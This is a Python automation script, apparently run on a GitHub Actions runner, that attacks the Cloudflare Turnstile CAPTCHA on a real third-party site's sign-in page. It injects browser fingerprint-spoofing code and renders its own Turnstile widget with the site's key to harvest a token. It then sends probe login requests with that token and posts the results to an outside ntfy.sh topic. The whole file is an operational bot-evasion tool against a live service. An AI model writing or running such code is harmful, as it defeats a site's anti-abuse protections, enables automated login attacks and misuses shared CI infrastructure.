#!/usr/bin/env python3
# GHA runner Turnstile v4: capture verdict via own widget callbacks
import os, sys, json, time, socket, subprocess, urllib.request, urllib.error, shutil

TOPIC = os.environ.get("TOPIC", "i42301ts-9f3a2c")
MODE = os.environ.get("MODE", "probe4")
BASE = os.environ.get("BASE", "https://yibuapi.com")
SITEKEY = os.environ.get("SITEKEY", "0x4AAAAAAGA1XSFhsC_wKQEx")
CAND_IPS = ["104.18.16.146", "104.18.17.146"]

def log(*a):
    line=" ".join(str(x) for x in a); print(line,flush=True)

def send(tag,text):
    text=str(text)
    for i in range(0,len(text),3800):
        try:
            req=urllib.request.Request("https://ntfy.sh/"+TOPIC,data=(("[%s %d] "%(tag,i//3800+1))+text[i:i+3800]).encode("utf-8","replace"),method="POST",headers={"Title":tag[:60]})
            urllib.request.urlopen(req,timeout=15).read()
        except Exception as e: print("NTFYERR",str(e)[:80],flush=True)

def egress():
    try: return urllib.request.urlopen("https://api.ipify.org",timeout=12).read().decode().strip()
    except Exception as e: return "ERR:"+str(e)[:60]

def curl_resolve(host,ip):
    try:
        p=subprocess.run(["curl","-s","-m","10","-o","/dev/null","-w","%{http_code}","--resolve","%s:443:%s"%(host,ip),"https://%s/"%host],capture_output=True,text=True,timeout=15)
        return p.stdout.strip() or "000"
    except Exception: return "000"

STEALTH=r"""
Object.defineProperty(navigator,'webdriver',{get:()=>undefined});
Object.defineProperty(navigator,'plugins',{get:()=>[1,2,3,4,5]});
Object.defineProperty(navigator,'languages',{get:()=>['en-US','en']});
window.chrome=window.chrome||{runtime:{},loadTimes:function(){},csi:function(){}};
if(navigator.permissions&&navigator.permissions.query){const o=navigator.permissions.query.bind(navigator.permissions);navigator.permissions.query=(p)=>p&&p.name==='notifications'?Promise.resolve({state:'denied'}):o(p);}
Object.defineProperty(navigator,'hardwareConcurrency',{get:()=>8});
const gp=WebGLRenderingContext.prototype.getParameter;
WebGLRenderingContext.prototype.getParameter=function(p){if(p===37445)return 'Intel Inc.';if(p===37446)return 'Intel Iris OpenGL Engine';return gp.apply(this,arguments)};
"""

def main():
    log("RUN",os.environ.get("GITHUB_RUN_ID","?"),"MODE",MODE,time.strftime("%Y-%m-%dT%H:%M:%SZ",time.gmtime()))
    eg=egress(); log("EGRESS",eg)
    bip=None
    for ip in CAND_IPS:
        st=curl_resolve("brunhild.challenges.cloudflare.com",ip); log("CURL_RESOLVE",ip,st)
        if st not in ("000","") and bip is None: bip=ip
    chrome=shutil.which("google-chrome") or shutil.which("google-chrome-stable")
    log("BRUNHILD_IP",bip,"CHROME",chrome)
    from playwright.sync_api import sync_playwright
    args=["--no-sandbox","--disable-dev-shm-usage","--disable-blink-features=AutomationControlled","--window-size=1366,900","--lang=en-US"]
    if bip: args.append("--host-resolver-rules=MAP brunhild.challenges.cloudflare.com %s"%bip)
    token=None; reqs=[]; resps=[]; cons=[]
    with sync_playwright() as p:
        b=None
        if chrome:
            try: b=p.chromium.launch(headless=False,channel="chrome",args=args); log("LAUNCH","chrome")
            except Exception as e: log("LAUNCH_CHROME_ERR",str(e)[:120])
        if b is None: b=p.chromium.launch(headless=False,args=args); log("LAUNCH","bundled")
        c=b.new_context(user_agent="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",viewport={"width":1366,"height":900},locale="en-US",ignore_https_errors=True)
        c.add_init_script(STEALTH)
        pg=c.new_page()
        pg.on("request",lambda r: reqs.append({"url":r.url,"post":r.post_data}) if "/api/user/login" in r.url else None)
        def on_resp(r):
            if "/api/user/login" in r.url:
                try: resps.append({"status":r.status,"body":r.text()[:400]})
                except Exception as e: resps.append({"status":r.status,"err":str(e)[:60]})
        pg.on("response",on_resp)
        pg.on("console",lambda m: cons.append("["+m.type+"] "+m.text[:150]))
        try: pg.goto(BASE+"/sign-in",wait_until="domcontentloaded",timeout=45000)
        except Exception as e: log("GOTO_ERR",str(e)[:120])
        ok=False
        for i in range(30):
            try:
                if pg.evaluate("()=>document.querySelectorAll('input[name=username]').length>0"): ok=True; break
            except Exception: pass
            time.sleep(1)
        log("USERNAME_INPUT_READY",ok)
        # discover sitekey actually used
        try:
            sk=pg.evaluate("()=>{const e=document.querySelector('[data-sitekey]');if(e)return e.getAttribute('data-sitekey');const h=document.documentElement.innerHTML.match(/0x4AAAA[A-Za-z0-9_-]{10,}/);return h?h[0]:null}")
            log("PAGE_SITEKEY",sk)
        except Exception as e: log("SK_ERR",str(e)[:80])
        # dump widget container html around hidden input
        try:
            log("WIDGET_HTML",pg.evaluate("()=>{const h=document.querySelector('input[name=cf-turnstile-response]');if(!h)return 'NO_HIDDEN';let e=h.closest('div');return e?e.outerHTML.slice(0,600):h.parentElement.outerHTML.slice(0,400)}"))
            log("FRAMES",json.dumps([f.url for f in pg.frames],ensure_ascii=False)[:500])
        except Exception as e: log("WIDGET_ERR",str(e)[:100])
        # inject our OWN turnstile widget with callbacks
        try:
            pg.evaluate("""(sitekey)=>{
              window.__tok=null;window.__err=null;window.__to=null;window.__cb=null;
              const d=document.createElement('div');d.id='__myts';document.body.appendChild(d);
              try{
                const wid=window.turnstile.render('#__myts',{sitekey:sitekey,
                  callback:(t)=>{window.__tok=t;},'error-callback':(e)=>{window.__err=String(e);},
                  'timeout-callback':()=>{window.__to=1;},'expired-callback':()=>{window.__exp=1}});
                window.__wid=wid;
              }catch(e){window.__err='RENDER_THROW:'+e}
            }""", SITEKEY)
            log("INJECT_WIDGET","done")
        except Exception as e: log("INJECT_ERR",str(e)[:120])
        # poll both widgets
        for i in range(150):
            try:
                st=pg.evaluate("()=>({own:window.__tok||null,err:window.__err,to:window.__to,exp:window.__exp||null,site:window.turnstile?window.turnstile.getResponse():null})")
            except Exception as e: st={"evalerr":str(e)[:60]}
            if st.get("own"): token=st["own"]; log("OWN_TOKEN_AT_S",i); break
            if st.get("site"): token=st["site"]; log("SITE_TOKEN_AT_S",i); break
            if i%12==11: log("TICK",i,json.dumps(st,ensure_ascii=False)[:200])
            time.sleep(1)
        log("TOKEN_LEN",len(token) if token else 0)
        if token: log("TOKEN_PREFIX",token[:24])
        try: pg.screenshot(path="signin4.png",full_page=True)
        except Exception: pass
        if token:
            try:
                pg.fill("input[name=username]","__ts_probe"); pg.fill("input[name=password]","WrongPass__123")
                pg.locator("button:has-text('Sign in')").first.click()
            except Exception as e: log("FORM_ERR",str(e)[:100])
            time.sleep(7)
            if not reqs:
                try:
                    r=pg.evaluate("""async(b)=>{const r=await fetch('/api/user/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(b)});return {status:r.status,body:(await r.text()).slice(0,400)}}""",{"username":"__ts_probe","password":"WrongPass__123","turnstile":token})
                    log("FETCH_turnstile =>",json.dumps(r,ensure_ascii=False)[:450])
                except Exception as e: log("FETCH_ERR",str(e)[:120])
        b.close()
    log("=== LOGIN_REQS ==="); [log(json.dumps(r,ensure_ascii=False)[:400]) for r in reqs]
    log("=== LOGIN_RESPS ==="); [log(json.dumps(r,ensure_ascii=False)[:500]) for r in resps]
    log("=== CONSOLE_all ==="); [log(l) for l in cons[-30:]]
    send("ts42301FINAL","EGRESS=%s BIP=%s TOKEN_LEN=%s RESPS=%s"%(eg,bip,len(token) if token else 0,json.dumps(resps,ensure_ascii=False)[:600]))
    log("DONE")

if __name__=="__main__": main()
